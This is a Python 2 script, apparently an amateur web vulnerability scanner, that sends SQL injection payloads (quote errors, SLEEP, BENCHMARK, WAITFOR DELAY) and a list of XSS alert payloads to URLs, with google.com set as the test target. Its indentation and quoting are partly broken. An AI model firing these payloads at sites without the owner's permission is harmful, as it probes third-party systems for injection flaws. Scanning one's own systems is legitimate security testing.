# -*- coding: utf-8 -*-

#Imports
from lxml import html
import bcolors
import os
import urllib
import urllib2
import getproxy
import time
import socket

#Constants
headers = { 'User-Agent' : 'Mozilla/5.0' }

def sql_error_scan(url,v = False) :
	req = urllib2.Request(url + "'", None, headers)

	try :
		src = urllib2.urlopen(req).read()
	except:
		return False

        if ("SQL syntax" in str(src) or "SQL Syntax" in str(src) or "SQL SYNTAX" in str(src)) :
                if (v) :
                         bcolors.printGreen("[+]Found 'SQL syntax' reference")
                return True
        elif ("SQL error" in str(src) or "SQL Error" in str(src) or "SQL ERROR" in str(src)) :
                if (v) :
                        bcolors.printGreen("[+]Found 'SQL Error' reference")
                return True
	elif ("sql_" in str(src)) :
		if (v) :
			bcolors.printGreen("[+]Found 'sql_' reference")
        else :
                return False

def sql_time_scan(url, v = False) :
	sleepCommands = ["-SLEEP(5000)", 
			 "-BENCHMARK(1000000000000000, rand())",
			 "; WAIT FOR DELAY '10:00:00'",
			 "'BEGIN DBMS_LOCK.SLEEP(15); END;--" ]
	
	#Get normal load-time
	req = urllib2.Request(url, None, headers)
	timeStart = time.time()
	try :
		response = urllib2.urlopen(req)
	except :
		return False

	latency = time.time() - timeStart
	if (v):
		print("[*]Latency is " + str(latency))
	socket.setdefaulttimeout(2*latency)
	######################

	for test in sleepCommands :
		req = urllib2.Request(url + test, None, headers)
		try :
			response = urllib2.urlopen(req)
		except socket.timeout :
			if (v) :
				bcolors.printGreen("[+] Time-based sql vulnerability found!")
			return True
		except:
			continue
	return False

def xss_vuln_scan(url, v = False) :
	#source: http://breakthesecurity.cysecurity.org/2012/02/complete-cross-site-scriptingxss-cheat-sheets-part-1.html
	xssStrings = ['>"><script>alert("1VULN")</script>&',
		      '<script>alert(“1VULN”)</script>',
		      '<script>alert(‘1VULN’)</script>',
		      '“><script>alert(“1VULN”)</script>',
		      '<script>alert(/1VULN”)</script>',
		      '<script>alert(/1VULN/)</script>',
		      '<ScRiPt>alert("1VULN")</sCriPt>',
		      '<IMG SRC=jAVasCrIPt:alert(‘1VULN’)>',
		      '<IMG SRC=”javascript:alert(‘1VULN’);”>',
		      '<IMG SRC=javascript:alert(&quot;1VULN&quot;)>',
		      '<IMG SRC=javascript:alert(‘1VULN’)',
		      '<<SCRIPT>alert(“1VULN”);//<</SCRIPT>']

	for test in xssStrings :
		req = urllib2.Request(url + test, None, headers)
		try :
			response = urllib2.urlopen(req)
		except :
			continue
		src = response.read()

		if ('<script>alert("1VULN")' in str(src) or '<IMG SRC=javascript:alert' in str(src)) :
			if (v) :
				bcolors.printGreen("[+]Found XSS vulnerability!")
			return True
	return False

def run_tests(links, testLevel = 1, v = False) :
	vulnUrls = []
	if (links == [] or links == None) :
		bcolors.printFail("[-]Invalid input parameters! Exiting...")
		return
	for link in links :
		if (testLevel > 0) :
		#Basic SQLi
			if(sql_error_scan(link, v)) :
				vulnUrls.append((link, "SQLi"))	
		if (testLevel > 1) :
		#Time based SQLi
			if(sql_time_scan(link, v)) :
				vulnUrls.append((link, "SQLiT"))
		if (testLevel > 2) :
		#XSS
			if(xss_vuln_scan(link, v)) :
				vulnUrls.append((link, "XSS"))
	return vulnUrls
if __name__ == '__main__' :
	testURLS = ['http://www.google.com'] #Insert test URLS here!
	import sys
	reload(sys)
	sys.setdefaultencoding('utf-8')
	res = run_tests(testURLS, 3, True)
	print(str(res))

